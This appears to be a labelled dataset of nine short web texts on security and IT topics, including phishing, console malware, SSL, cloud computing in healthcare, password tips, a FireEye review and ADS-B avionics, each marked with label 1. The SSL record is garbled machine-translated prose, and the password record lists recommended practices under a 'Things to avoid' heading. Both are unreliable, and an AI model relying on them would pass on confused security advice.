{"text": "Phishing: The Basics\nHere's how to be on your guard against phishing attacks\nCSO — Phishing is a method of trying to gather personal information using deceptive e-mails and websites. Pharming also aims to collect personal information from unsuspecting victims by essentially tinkering with the road maps that computers use to navigate the Web. You don't want either one working its evil genius on you, your employees or your customers. Here's how to be on your guard against both phishing and pharming. Last updated: April 2009\n- What is phishing?\n- Can we prevent phishing attacks?\n- What can my company do to reduce our chances of being targeted?\n- What plans should my company have in place before a phishing incident occurs?\n- How can we quickly find out if a phishing attack has been launched using our company's name?\n- How can we help our customers avoid falling for phishing?\n- If an attack does happen, how should we respond?\n- Any legal/regulatory requirements we should be aware of?\n- What action can we take against the phishers themselves?\n- How might phishing attacks evolve in the near future? (E.g. \"spear-phishing)\n- How can we guard against pharming attacks?\nQ: What is phishing?\nA: Phishing is a method of trying to gather personal information using deceptive e-mails and websites. Typically, a phisher sends an e-mail disguised as a legitimate business request. For example, the phisher may pass himself off as a real bank asking its customers to verify financial data. (So phishing is a form of \"social engineering\".) The e-mail is often forged so that it appears to come from a real e-mail address used for legitimate company business, and it usually includes a link to a website that looks exactly like the bank's website. However, the site is bogus, and when the victim types in passwords or other sensitive information, that data is captured by the phisher. The information may be used to commit various forms of fraud and identity theft, ranging from compromising a single existing bank account to setting up multiple new ones.\nEarly phishing attempts were crude, with telltale misspellings and poor grammar. Since then, however, phishing e-mails have become remarkably sophisticated. Phishers may pull language straight from official company correspondence and take pains to avoid typos. The fake sites may be near-replicas of the sites phishers are spoofing, containing the company's logo and other images and fake status bars that give the site the appearance of security. Phishers may register plausible-looking domains like aolaccountupdate.com, mycitibank.net or paypa1.com (using the number 1 instead of the letter L). They may even direct their victims to a well-known company's actual website and then collect their personal data through a faux pop-up window.\nCan we prevent phishing attacks?\nCompanies can reduce the odds of being targeted, and they can reduce the damage that phishers can do (more details on how below). But they can't really prevent it. One reason phishing e-mails are so convincing is that most of them have forged \"from\" lines, so that the message looks like it's from the spoofed company. There's no way for an organization to keep someone from spoofing a \"from\" line and making it seem as if an e-mail came from the organization.\nA technology known as sender authentication does hold some promise for limiting phishing attacks, though. The idea is that if e-mail gateways could verify that messages purporting to be from, say, Citibank did in fact originate from a legitimate Citibank server, messages from spoofed addresses could be automatically tagged as fraudulent and thus weeded out. (Before delivering a message, an ISP would compare the IP address of the server sending the message to a list of valid addresses for the sending domain, much the same way an ISP looks up the IP address of a domain to send a message. It would be sort of an Internet version of caller ID and call blocking.)\nAlthough the concept is straightforward, implementation has been slow because the major Internet players have different ideas about how to tackle the problem. It may be years before different groups iron out the details and implement a standard. Even then, there's no way of guaranteeing that phishers won't find ways around the system (just as some fraudsters can fake the numbers that appear in caller IDs). That's why, in the meantime, so many organizationsand a growing marketplace of service providershave taken matters into their own hands.\nWhat can my company do to reduce our chances of being targeted by phishing attacks?\nIn part, the answer has to do with NOT doing silly or thoughtless things that can increase your vulnerability. Now that phishing has become a fact of life, companies need to be careful about how they use e-mail to communicate with customers. For example, in May 2004, Wachovia's phones started ringing off the hook after the bank sent customers an e-mail instructing them to update their online banking user names and passwords by clicking on a link. Although the e-mail was legitimate (the bank had to migrate customers to a new system following a merger), a quarter of the recipients questioned it.\nAs Wachovia learned, companies need to clearly think through their customer communication protocols. Best practices include giving all e-mails and webpages a consistent look and feel, greeting customers by first and last name in e-mails, and never asking for personal or account data through e-mail. If any time-sensitive personal information is sent through e-mail, it has to be encrypted. Marketers may wring their hands at the prospect of not sending customers links that would take them directly to targeted offers, but instructing customers to bookmark key pages or linking to special offers from the homepage is a lot more secure. That way, companies are training their customers not to be duped.\nIt also makes sense to revisit what customers are allowed to do on your website. They should not be able to open a new account, sign up for a credit card or change their address online with just a password. At a minimum, companies should acknowledge every online transaction through e-mail and one other method of the customer's choosing (such as calling the phone number on record) so that customers are aware of all online activity on their accounts. And to make it more difficult for phishers to copy online data-capture forms, organizations should avoid putting them on the website for all to see. Instead, organizations should require secured log-in to access e-commerce forms.\nAt the end of the day, though, better authentication is the best way to decrease the likelihood that phishers will target your organization. Banks are beginning to experiment with technologies like RSA tokens, biometrics, one-time-use passwords and smart cards, all of which make their customers' personal information less valuable for phishers.\nOne midsized bank was able to cut its phishing-related ATM card losses by changing its authentication process. Every ATM card has data encoded on its magnetic strip that the customer can't see but that most ATM machines can read. The bank worked with its network provider to use that hidden information to authenticate ATM transactionsan important step that, according to Gartner, only about half of U.S. banks had taken by mid-2005. \"Since the number isn't printed on the back of the card, customers can't accidentally disclose it,\" the bank's CISO explained. The information was already in the cards, so the bank didn't have to go through an expensive process of reissuing cards. \"It was a very economical solution, and it's been very effective,\" said the CISO.", "label": 1}
{"text": "Malicious programs for computers have been around for more than 20 years. It was the birth of the Internet which really enabled these digital pests to make a breakthrough.\nUntil now, gaming consoles have been more or less immune to malware. Yes, there're been Trojans for the Nintendo DS console (Trojan.Nintendo.Taihen.a and .b) and for the Sony Portable Playstation (Trojan.PSP.Brick.a) but the number of victims has been small. This is because the user has to tweak the console in order for so-called homebrew software (i.e. software not certified by the console manufacturer) to run.\nThere's a Linux distribution available for the Sony Playstation 2 (which will also be available for Playstation 3) which just cries out for programming. However, any programs created will only run on Playstations which have the distribution installed.\nMicrosoft recently announced that in future, users will be able to purchase a development kit with a $99 a year registration fee - no Linux here. Programs developed using the kit will only run on Xboxes where the user has also paid the registration fee, and they can only be copied to another console as source code. From a security point of view, this is a wise decision.\nI hope that things won't change much in the near future. If Sony, Microsoft , Nintendo or hackers made it possible to easily download programs developed by users via the Internet, Pandora's box would be opened. The combination of unprotected gaming consoles, the Internet and the possibility of previously unknown vulnerabilities would lead to gamers who had been immune to malware becoming a target for virus writers.", "label": 1}
{"text": "Software is everywhere. We love it when it makes our lives easier. We hate it when it doesn't work the way we expect—or when its design is not sufficiently intuitive or robust. Software is in our military systems—satellites, tanks, aircraft and ships—but it's also in our everyday life: toasters, automobiles, banks, and medical equipment.\nSoftware is important and its importance is growing. Software allows us to personalize and customize many systems. It brings increasingly complex integrated circuits to life and harnesses their power to help us. It allows us to communicate more efficiently, to live in a more connected world, to operate businesses more effectively. Multi-national businesses have software-intensive enterprise systems while small businesses and individuals use the Internet for ever growing applications.\nUnfortunately, there is a gap between the state of the art and the state of the practice of software engineering. Many senior managers don't understand software engineering and many software practitioners have lapsed into undisciplined, ad hoc practices. Consequently, software design, development and integration are often plagued by schedule delays, cost increases, performance problems and defects.\nData indicate that 60-80% of the cost of software development is in rework, that is, fixing defects that are found during testing. Fortunately, there is an alternative. We can reduce test and rework costs significantly if we use better design and implementation practices. We can meet schedules and we can reduce the variability and risk in software intensive programs. We can make our software teams more productive and raise the quality of their work experience if we follow disciplined engineering practices.\nCommercial software products today are often riddled with defects—commonly known as \"bugs\"— that are introduced in the software's design and development. As our systems become more and more interconnected in networks, the stakes are rising. Defects in products that are linked to the Internet open vulnerabilities to cyber attack and exploitation. The Internet is only as secure as its weakest link.\nEach year, the SEI's CERT Coordination Center (CERT/CC) documents thousands of commercial product vulnerabilities. Once again, however, there is an alternative. Most of these vulnerabilities are due to a modest number of root causes. We can avoid these vulnerabilities and greatly reduce the number of successful cyber attacks if software developers use the proven best design techniques of software engineering.\nThe SEI's core purpose is to improve the state of the art in software engineering, and to transition this work to the community so we improve the state of practice in software engineering as well. Our work is not done unless we do both parts of our job. We believe, and we have the evidence to support us, that the best way to ensure the security of software is to design, develop, and integrate software in a way that does not allow defects into software in the first place. Investments in up-front discipline and sound processes increase quality and security and decrease cost and risk.\nWe are part of Carnegie Mellon University, one of the nation's premier computer science and engineering institutions. Since 1984, we have been identifying, developing, and advocating practices to improve all aspects of software. At the SEI, we emphasize defect prevention through improvement of process and product quality during the early phases of system development. We believe you should design quality into software, not test and patch it.\nAt SEI, we're developing innovative software technologies to meet today's challenges and tomorrow's opportunities.\nPaul D. Nielsen\nDirector and Chief Executive Officer\nSoftware Engineering Institute", "label": 1}
{"text": "The FAA Rule Affects Canadians, Too\nWednesday June 20th 2012 - by Daryl MacIntosh\nUpcoming FAA Requirements\nIn May of 2010, the FAA published the final rulemaking to adopt ADS-B (automatic dependent surveillance-broadcast) technology as its primary aircraft tracking/locating system. Effective Jan. 1, 2020, aircraft operating in the majority of United States airspace must be equipped with ADS-B Out compliant equipment. Use of ADS–B Out will move air traffic control from a primarily ground-based radar system to a satellite-derived aircraft location system. Benefits to ATC include improved accuracy, wider coverage, better reliability, reduced latency, increased capacity and controller access to more comprehensive aircraft data. The current radar surveillance system that ATC has relied on for more than 50 years has now reached its capacity limits, leading to congestion and delays in some of the busiest U.S. airspace.\nADS-B in Canada\nLimited ADS-B service was implemented in Canada on Jan. 15, 2009, bringing surveillance coverage for the first time to 850,000 square kilometres of high level airspace (FL290 to FL410) over Hudson Bay. About 35,000 flights a year use this airspace on routes between North America and Europe or Asia.\nOne of the most significant benefits ADS-B offers for this airspace is reduced aircraft separation. With appropriately-equipped aircraft, controllers can use five-nautical-mile separation instead of the 80-nautical-mile procedural separation required in non-radar airspace. ATC can handle more aircraft in the same airspace at once and controllers can offer route flexibility and approve altitude-change requests more readily.\nNav Canada expanded its ADS-B coverage over northeastern Canada by an additional 1.9 million square kilometres in 2010, and recently added another 1.3 million square kilometres over the North Atlantic (see p.18). However, the upcoming United States ADS-B requirements will affect many more Canadian aircraft operators than will Nav Canada’s ADS-B requirements. Most of us don’t need to fly over Hudson Bay, but many of us do regularly fly within U.S. airspace.\nADS-B Out Defined\nAutomatic: Each aircraft equipped with ADS-B Out will Automatically and continuously transmit its precise position, its velocity (vertically and horizontally), as well as its altitude and other relevant information. The system is always on and requires no pilot action for activation.\nDependent: The overall system is Dependent on each aircraft to transmit accurate data including identification (ICAO 24-bit ID), position, and velocity, together with specific integrity/accuracy quality information.\nSurveillance: The system provides ATC with Surveillance capability similar to radar.\nBroadcast: Each aircraft will continuously Broadcast the required data. The system does not require interrogation from ATC or from another aircraft.\nOut: Although the overall ADS-B system is designed to be bi-directional, only ADS-B Out data capability is becoming mandatory.\nADS-B In capability is a key design feature of the overall ADS-B system, but the FAA did not make this capability mandatory. Many operators will, however, choose to install ADS-B In because of the significantly improved situational awareness the available data will provide to flight crews.\nTIS-B (traffic information service-broadcast) and FIS-B (flight information services-broadcast offering weather data, airspace information and other services) are available as free uplinks to any aircraft that carries the correct receiving equipment.\nEquipment - Technology Choices\nThe ADS–B Out capability regulation requires operators to install equipment into each aircraft that will provide a data link to ATC to be used for aircraft surveillance. Operators must choose between two completely different types of equipment required under this rule: a 1090 MHz extended squitter (ES) broadcast link or a universal access transceiver (UAT) broadcast link operating on 978 MHz. In addition to the broadcast link, each aircraft must also be equipped with an approved GPS to provide the required aircraft position source data.\nEquipment Choice # 1 - 1090 MHz ES\nEquipment certified for this option transmits on 1090 MHz, the same frequency as current transponders. Some Mode S transponders with ES can be certified to meet the latest ADS-B Out requirements. The 1090 MHz ES broadcast link is the internationally agreed-upon standard and is required for aircraft that fly into any other jurisdictions that utilize ADS-B. The final FAA rule requires aircraft flying at and above 18,000 feet MSL [flight level (FL) 180, Class A Airspace] to have ADS–B Out performance capabilities using the 1090 MHz ES broadcast link. This rule also specifies that aircraft flying in designated airspace below 18,000 feet MSL may use either the 1090 MHz ES or the UAT broadcast link. There are two significant disadvantages to the 1090 MHz ES system: (1) A separate 1090 MHz receiver must be installed for ADS-B In capability, as current Mode S transponders do not have ADS-B receiver capability; and (2) The 1090 MHz ES broadcast link does not support FIS–B (weather and related flight information) due to bandwidth limitations.\nEquipment Choice # 2 – 978 MHz UAT\nThe 978 MHz UAT broadcast link utilizes a bi-directional 978 MHz transceiver which supports ADS–B In applications, including traffic information and FIS-B data including weather, temporary flight restrictions (TFRs) and notices to airmen (NOTAMs). The 978 MHz UAT is a proven and mature technology which has provided similar services in Alaska since 2001. The UAT may not be used for ADS-B Out on aircraft that fly above 18,000 feet. The FAA does encourage general aviation (GA) pilots whose aircraft always operate below 18,000 feet to opt for the 978 UAT, in order to minimize frequency congestion on 1090 MHz.\nCombined Equipment Choice – 1090 Mhz ES Out with 978 Mhz In\nSome operators will undoubtedly choose to install a combination solution utilizing 1090 MHz for ADS-B Out, to satisfy the regulatory requirement for flights above 18,000 feet, and using a 978 MHz UAT for ADS-B In, to benefit from its enhanced data-in capability.\nBest Equipped – Best Served\nATC service has traditionally been based on a policy of “first come, first served” but the FAA is now moving towards a new policy of “best equipped, best served.” The FAA has explained that this policy change will help to reduce congestion and delays while simultaneously encouraging system users to equip their aircraft earlier than the regulation requires. By providing operational benefits to the early adopters, the FAA hopes they will then have an incentive to accelerate and expand ADS-B equipage to the rest of their fleets. ADS-B is already providing services in South Florida; Louisville, Kentucky; Philadelphia and out over the Gulf of Mexico. The installation of ground stations to serve the rest of the United States is now well underway and is scheduled to be completed by 2013. The system’s 794 ground stations should be substantially operational by 2014. The FAA expects most users will equip their aircraft during the five-year period between 2015 and the 2020 deadline.\nThe expected cost to equip an aircraft with a compliant system is evolving because most avionics manufacturers are currently working to modify and/or re-qualify their products to meet the latest published specifications. For GA aircraft already equipped with a WAAS GPS and a Garmin Mode S transponder, the upgrade to ADS-B Out is a relatively painless and inexpensive transponder upgrade. Most other GA aircraft owners will need to spend at least $6,000 to meet the minimum ADS-B Out requirements. The fully-installed cost for some GA aircraft will be much higher (perhaps $20,000) when the cost of a new WAAS GPS navigator and/or a new multi-function display is factored in.\nThe cost to equip Part 25 business and commercial aircraft will likely be much greater (perhaps $150,000) due to much higher equipment and certification costs. Typical modifications will include new (or upgraded) mode S transponders and a modified traffic collision avoidance system. Some aircraft will also require a new FMS and many will require significant wiring modifications.\nADS-B is also being adopted by a variety of countries around the world as the new standard for aircraft surveillance. Canadian operators who choose not to equip, because they don’t fly to the United States or within other ADS-B airspace, may still be affected by the new U.S. regulations. When it comes time to sell their aircraft, they may find that its value is diminished because it can’t fly within the United States. The U.S. ADS-B equipage requirement is real; the deadline is approaching, and it’s time for everyone to start paying attention.\nDaryl MacIntosh is founder and president of Maxcraft Avionics. Located at the Pitt Meadows Airport, about 35 kilometres east of Vancouver, Maxcraft is one of the largest full-service avionics shops in Canada, and provides professional avionics services to operators of all types of private and commercial aircraft, including piston, turboprops, jets and helicopters. He can be reached at firstname.lastname@example.org.\nDid you know?\nTrans-Canada Air Lines (later to become Air Canada) first had flight attendants in July, 1938. At first, only single women under 26 were selected, and they served small boxed lunches and cups of coffee and lemonade.", "label": 1}
{"text": "Technically SSL works as follows:\nAt the \"https\" Your browser recognises that he mentioned server, a certificate request. For the server the browser has returned a certificate, it must be certified by the certification body. Then notify the server of this certificate directly to the browser. The browser receives from the directory service of the certification authority information, whether the certificate is valid. Based on these data, the browser can now check whether he really is connected to the server, in the URL. If so, your browser indicates a secure connection. For Internet Explorer and Firefox, this is done by a closed padlock. The Netscape Navigator / Communicator shows a secure page by the key intact.\nThen the two agree on a balanced computer keys. This understanding is happening in the safe asymmetric encryption. To really on the safe side, your browser sends the server before the start of the actual data exchange some test messages. This can only answer the server when it is actually the server, which he pretends to be.\nLooking even further the three objectives of encryption: does the SSL protocol so that a secure connection:\n1st Your data is confidential, because the content of your messages only encrypted over the network.\n2nd The authenticity of the server.\n3rd Your data is protected from tampering, as effective algorithms examine whether the data is complete and unaltered their respective recipients.\nMeanwhile, SSL as a standard for encryption established browser. Meanwhile, but also Transport Layer Security (TLS). TLS is in place by SSL 3.0 standardized and expanded the range of use encryption methods to the Advanced Encryption Standard (AES). TLS is based on the more complex encryption methods Triple DES (Data Encryption Standard - Datenverschlüsselungs standard) or other algorithms. It supports the encryption of e-mails and the proof of identity for commercial online transactions.", "label": 1}
{"text": "Cloud computing as commonly defined is when a business gives its data, applications, storage and computational power to a cloud computing provider and accesses those resources via the public Internet. It's been a godsend for many organizations, most notably small enterprises that can save enormously on infrastructure costs and have access to highly skilled I.T. expertise that they couldn't afford otherwise. Salesforce.com and Amazon.com have quickly become giants in the \"public\" cloud service sector thanks to the convenience and low start-up costs for their services. International Data Corp., a technology research firm, estimates in a recently released report that the cloud software market reached $22.9 billion in 2011, a 31 percent year-over-year growth increase. The market is expected to reach $67.3 billion by 2016 at a compound annual growth rate of 24 percent. IDC also estimates that small businesses-defined as those with 100 or fewer employees-spent $3.5 billion on cloud technologies in 2011, or about 7 percent of the $53 billion the small business segment spent overall on I.T. expenditures.\nThat enthusiasm for remotely hosted services and low-cost infrastructure is shared by the health care industry, but not necessarily in the same way, or to the same degree, as industries such as construction or retail.\nKLAS Enterprises, a Utah-based health care I.T. research firm, polled nearly 100 provider organizations for a 2011 \"perception\" study of cloud computing. Right off the bat, Erik Westerlind, the report author, had to sift through how respondents-of which nearly 70 percent were C-level executives-defined cloud computing.\n\"We ran into a lot of cases where executives would tell us that yes, they use the cloud because they're having their electronic health record remotely hosted by Cerner, for example,\" he says. \"But those types of services are not really how \"The Cloud\" is typically defined outside this market-yes, they're remotely hosted, but the applications are running via direct connections to Cerner's data center, and all their information is housed in one place, Kansas City.\"\nSome of the confusion about how to define cloud services is due to the \"cloud washing\" going on-rebranding application service provider or application hosting services as \"cloud\" solutions.\n\"True\" cloud service is virtualized, elastic, scalable, metered out and resides on pooled or shared resources on the Web. Respondents mentioned every one of these attributes, but only a few mentioned them all, according to the KLAS report.\nThe health care execs most commonly used two attributes-an application was remotely hosted, and it was available via the Web-to define the cloud.\nThe bottom line is that interest in the cloud is strong in health care, but neither KLAS nor other industry experts expect a stampede of providers to a public cloud environment where their data is stored and accessible via the public Web.\nNot surprisingly, data security and privacy, and lack of control, are the top concerns of health care execs. And while health care is-has to be-downright obsessive about security and privacy, those concerns are not exclusive to the industry. The IDC report and other cloud research finds the top drawback for adopting cloud services is data security.\n\"One hospital CIO summed it up pretty neatly-he noted that he has to go before his board of directors every year and attest to them that the hospital is compliant with HIPAA regulations, one requirement being that he certifies that he knows where its data resides,\" Westerlind says. \"In a public cloud that data could be anywhere in the world. That pretty much sums up why many are taking a cautious approach to public cloud services.\"\nBut then again, interest is high in cloud computing, and 55 percent of respondents to the KLAS survey are currently deploying some part of their I.T. environment in the cloud, where the definition was the delivery of storage solutions, software solutions, or both over the Web.\nAt this point, much of the industry's interest is focused on creating private clouds that enable providers to keep control of their data by either storing it on virtual servers they own, or putting it on dedicated virtual servers owned by trusted third parties.\nA lot of the future of health care cloud computing hinges on trust. While much has been made of the reluctance of health care organizations to use the cloud, another roadblock has been the lack of cloud service providers willing to take on the burden of handling health care data, says Jeffrey White, a principal at Pittsburgh-based Aspen Advisors, a health care consultancy.\n\"There's been a reluctance on the part of cloud platform providers to sign HIPAA business associate agreements, which has really hampered the development of truly cloud-based services in the market,\" White says.\nAs a result, many organizations are using hosting services from established health I.T. vendors, which provides some but not all of the benefits of a Web-based cloud environment. However, the cloud is coming, thanks in part to the health care industry's increased focus on collaboration and consumerism.\nDignity Health provides a good example of how and why cloud computing is starting to carve out a health care space.\nDignity Health is massive, encompassing more than 40 hospitals, operating in 17 states, and with 60,000 providers working at its facilities. Not surprisingly, the health system has a large and skilled I.T. department and a massive technological infrastructure. But while it has the internal capability to meet pretty much any data demand thrown at it, Dignity Health is putting more and more information on a cloud platform managed by a third party, says Scott Whyte, the vice president of I.T. connectivity.\nThe impetus behind most of its cloud efforts is the need to collaborate with more and more business partners and provide additional services to physicians and patients. And those various projects need to be done yesterday.\n\"We're forming an accountable care organization and getting more involved with independent physicians, and everything has to happen fast because we're dealing with aggressive timelines, either because they're regulatory timelines or we have competitive pressures,\" Whyte says. \"While we have the resources to do this internally, our cloud services partner brings a lot to the table-they can spin up data center capacity very quickly, and they have very skilled human resources that augment our own staff.\"\nIn addition, that partner, Phoenix-based ClearDATA Networks Inc., serves only the health care market, and consequently is steeped in the sometimes esoteric health security and privacy requirements required, Whyte says.\nAnd while it might not matter in every case and to all providers, the cloud services also enable Dignity to expand its I.T. environment using operating expenses instead of capital outlays for more servers and other infrastructure, he adds.\nDignity Health also has found that many of its new partners, be they competing hospitals, or insurers or independent physicians, want to have all the collaborative data stored in \"neutral\" territory separated from their larger infrastructures, Whyte says.\nNot only are there competitive reasons to want to ensure the data is on neutral ground, but it also means there are fewer legal and compliance hoops to jump through to share the necessary data, which enables the organizations to speed up the development timelines.\nOne example is the physician metric reports being used for the emerging ACO, Whyte says. \"That's an application that is really well-suited for a Web-based cloud environment: we need to share data among partners and make it widely accessible to physicians using all different types of devices to access it.\"\nCloud computing at Dignity will grow, but likely won't encompass its core legacy systems, Whyte says. \"We are not fork-lifting legacy applications to the cloud: We use Cerner Corp.'s hosting services for our EHR, and we have no plans to move our core financials [from Lawson Corp.] to a cloud environment. We are using the cloud for the new types of collaborative applications we need to offer.\"\nCollaboration doesn't necessarily have to be external, either.\nAs health systems continue to grow through consolidation and buying up physician practices, the management of internal data needed for collaborative efforts is getting more complex.\nJonathan Teich, M.D., the chief medical information officer at Elsevier Corp. and a practicing physician at Brigham and Women's Hospital in Boston, says the use of cloud platforms for knowledge is far less daunting than the idea of changing the entire computing paradigm.\nElsevier, an Amsterdam-based provider of clinical decision support information, plans to soon make a new service generally available that enables health systems to manage and maintain their clinical order sets via a cloud service.\n\"Health systems with hundreds or thousands of order sets have a hard time having local staff maintain them, and many are widely dispersed, which makes it more difficult to collaborate,\" Teich says.\nThat idea of fork-lifting core applications into a cloud environment is a task that many providers seem unwilling to tackle at this point. Much of that big legacy technology, as White from Aspen Advisors points out, is built of proprietary architectures that are not well-suited to transition into a cloud environment.\nNot only that, but most cloud providers at this point can't guarantee the reliability and service levels health care organizations require for those applications. \"When it comes to core systems, providers have invested heavily in the infrastructure around them, including investments in virtualizing their servers and to provide a level of redundancy, that they're uncertain they can get from a cloud platform. If you look across different industries, including the financial sector, you're seeing cloud adoption, but they're not running their businesses over the cloud.\"\nDan Riskin, M.D., CEO of Menlo Park, Calif.-based Health Fidelity and consulting assistant professor at Stanford University, says that his is one of a new wave of health care cloud companies providing a low-cost bridge to convert data into knowledge.\nHealth Fidelity uses natural language processing technology-which incorporates the Medical Language Encoding and Extraction system from Columbia University-to identify and encode clinical information in caregiver narratives to standard code sets, such as ICD-9 and 10, CPT-4 and LOINC.\nThe company works with solution providers to standardize all that unstructured data in feeds from providers for use in analytics, revenue cycle and compliance efforts. \"Even with the all the efforts at making health care all about discrete data, around 80 percent of the clinical information is unstructured in clinical notes,\" he says.\nMining the mountain of unstructured data takes a lot of computational power. Cloud platforms, Riskin says, are ideally suited for the task.\n\"Analytics requires processing power and expertise, and cloud computing is proving in health care and other markets that it can deliver faster and cheaper than internal resources,\" he says. \"What we and other start-ups in this space are doing is bypassing the manual processes of data collection and standardization that take such an enormous amount of time and resources to perform.\"\nIn Riskin's mind, new health I.T. start-ups, many of which are using cloud computing platforms, are the ones that can work with the data holders in the market-the hospitals, practices and health information exchanges among them-and find ways to embed new knowledge into care processes.\n\"What the country bet on, and is paying for, is that if the industry can digitize its information, it could make it rapidly useful for those innovative approaches to improve care.\" Riskin says. \"That simply isn't going to happen if health systems and hospitals are trying to use internal resources to mine their Big Data. Cloud computing platforms enable processing power to be spun up, and adjustments to be made on the fly. \"When I think about the power and flexibility of cloud computing, I'm frankly shocked that we're still having multi-million dollar, on-site installs.\"", "label": 1}
{"text": "How safe is your password?\nThe first step in protecting your online privacy is creating a safe password - i.e. one that a computer program or persistent individual won't easily be able to guess in a short period of time. To help you choose a secure password, we've created a feature that lets you know visually how safe your password is as soon as you create it.\nTips for creating a secure password:\nThings to avoid:\n- Include punctuation marks and/or numbers.\n- Mix capital and lowercase letters.\n- Include similar looking substitutions, such as the number zero for the letter 'O' or ' for the letter 'S'.\n- Create a unique acronym.\n- Include phonetic replacements, such as 'Luv 2 Laf' for 'Love to Laugh'.\nTips for keeping your password secure:\n- Don't use a password that is listed as an example of how to pick a good password.\n- Don't use a password that contains personal information (name, username, birth date, etc.)\n- Don't use words or acronyms that can be found in a dictionary.\n- Don't use keyboard patterns (asdf) or sequential numbers (1234).\n- Don't make your password all numbers, uppercase letters or lowercase letters.\n- Don't use repeating characters (aa11).\n- Never tell your password to anyone (this includes significant others, roommates, parrots, etc.).\n- Never write your password down.\n- Never send your password by email.\n- Periodically test your current password and change it to a new one.", "label": 1}
{"text": "GCN LAB REVIEW\nDevice spots, stops advanced malware before it can cripple a network\nFireEye's virtual machines profile an attack and then disrupt it before it strikes\nA lot of protections are built into most federal and corporate networks these days. Between firewalls, intrusion prevention systems, port monitoring and even desktop antivirus, you would think security is pretty air tight.\nYet major breaches such as the recent hack of the Sony PlayStation Network and other high-profile attacks show bad guys can still find ways to get through sophisticated defenses, especially if they are patient and target attacks specifically at an agency or group.\nThe FireEye malware protection system, the GCN product of the month for June, has an unusual approach to these exploits. It uses a unique system of virtual machines that lets malware do whatever it wants, and then shuts it down on the real network. As such, no signatures are needed and even new attacks are caught before any significant damage occurs.\nAdvanced persistent threats are a new way of life\nIs China out-gunning U.S. in cyber war?\nThe FireEye is deployed in three components as appliances. There is an e-mail monitor, an Internet traffic monitor and a control device that lets those two systems communicate with each other and work together to stop threats.\nThe FireEye team came into the GCN Lab to show what happens during a type of attack that most current protections would miss. In this example, we used the same type of technique that was performed in the recent Aurora attack, considered an advanced persistent threat that targeted several high-tech firms in 2009-2010.\nIn that event, hackers patiently stalked hand-chosen victims for months, gathering data on corporate security before sending e-mail messages and instant messaging notes that appeared to come from friends. In many cases, the attack was tweaked to specifically get around whatever security was in place. Most attacks were delivered as a malicious binary file designed to look like a normal .jpg. Once the .jpg was in place, it called home and downloaded encrypted packages of malware that were designed to steal data and cripple networks.\nGears of a virtual machine\nWhen a similar program was sent into a network protected by FireEye, the malicious binary began to do its dirty work like it was programmed to do. But it didn’t know that FireEye had moved it over to a virtual machine and not to an end-user’s computer. FireEye watched as the program phoned home and gathered more malware components from compromised systems. It didn’t matter that the incoming malware components were encrypted to get around traditional virus scanners, because for the bad programs to activate, they had to un-encrypt themselves. And when they did, FireEye watched the process unfold.\nAfter the details of the attack were known, ports and IP addresses were blocked to prevent the malware from working its evil on the actual network. The FireEye e-mail scanner and the Internet traffic scanner worked together to stop anything bad from happening. In a sense, FireEye creates a virtual honey pot for malware, lets it do what it wants, but only on the virtual and easily purged machine. Then it prevents the same things from hurting the real network.\nA very detailed report is generated showing exactly who inside the network was targeted, what files were used and how dangerous the threat actually is to overall security. Copies of all the malicious files are kept and stored in case administrators or analysts want to further examine them to learn more about the hackers. That data could be used to prevent future attacks, or even prosecute the guilty parties since the hackers’ digital fingerprints will still be all over the captured files.\nIf an attack is delivered by e-mail, FireEye can stop it from ever reaching the network, because the mail can simply be delayed while the virtual machines examine anything suspicious. However, if the attack is delivered in real time, such as through a corrupted Web page, one user in the network will likely be infected because code will be executing on their computer at the same time as the virtual machine. Calls out for new malware will be blocked, since FireEye monitors both inbound and outbound traffic, but one person will still have the corrupted files sitting on their computer. The good news is that administrators are immediately told exactly who is infected and how they got that way, and the infection is sealed up on that single machine.\nFireEye also works if someone brings a keydrive with malware into the network directly without first passing through the FireEye Scanner. In that case, the malicious activity would be caught because of the outbound traffic that is being scanned, which can also be run through a virtual machine for processing.\nPricing for the FireEye components seems reasonable given that it will even stop attacks where hackers have invested months or even years specifically targeting an agency. For a unit that is able to scan 50 megabits/sec of Internet or mail traffic, the cost is about $50,000. A unit that can scan a full 1 gigabit/sec costs $100,000. FireEye officials say they’re working on machines with even higher capacity.\nGiven the sophistication and malicious nature of hackers these days, a product like FireEye that can be easily plugged into existing network security to protect against both widespread and narrowly targeted attacks arrives none too soon. And seeing how most federal agencies have targets on their back, having FireEye watch over them is a no-brainer.", "label": 1}
{"text": "In March 2011, the U.S. computer security company RSA announced that hackers had gained access to security tokens it produces that let millions of government and private-sector employees, including those of defense contractors such as Lockheed Martin, connect remotely to their office computers.\nMost critical information systems in the United States are operated by the private sector and remain vulnerable to cyber attacks. Newly proposed legislation would require businesses to meet minimum standards of protection, but has raised concerns about regulatory overreach.\nGrounded in a realistic assessment of technology, Matthew C. Waxman and Kenneth Anderson outline a practical alternative with which to evaluate the use of autonomous weaponry that incorporates codes of conduct based on traditional legal and ethical principles governing weapons and warfare.\nAdam Segal says the recent Chinese cyberattacks on Bloomberg and the New York Timeshighlights both the willingness of Beijing to shape the narrative about China, as well as the vulnerability the top leadership feels about how they are portrayed.\nCyber weapons are different from conventional weapons in that their effects do not directly manifest themselves in the \"real world.\" There are three broad categories of potential effects of cyberattacks: personal, economic, and physical.\nAdam Segal, CFR's Maurice R. Greenberg senior fellow for China studies, leads a conversation on U.S.-China relations through the lens of cybersecurity issues, as part of CFR's Academic Conference Call series.\nLinda Robinson discusses her recently released Council Special Report, The Future of U.S. Special Operations Forces, which calls for conceptual, institutional, and operational changes to reorient U.S. special operations forces to ensure that they are employed to best effect.\nForeign governments, non-state actors, and criminal networks are targeting the digital networks of the United States with increasing frequency and sophistication. U.S. cybersecurity has made progress, but relies heavily on the private sector to secure infrastructure critical to national security.\nCybersecurity expert Knake recommends the United States use international forums to promote mechanisms that address security concerns in cyberspace while ensuring the Internet remains open for the free exchange of ideas across national boundaries.\nThe Council on Foreign Relations' David Rockefeller Studies Program—CFR's \"think tank\"—is home to more than seventy full-time, adjunct, and visiting scholars and practitioners (called \"fellows\"). Their expertise covers the world's major regions as well as the critical issues shaping today's global agenda. Download the printable CFR Experts Guide.", "label": 1}
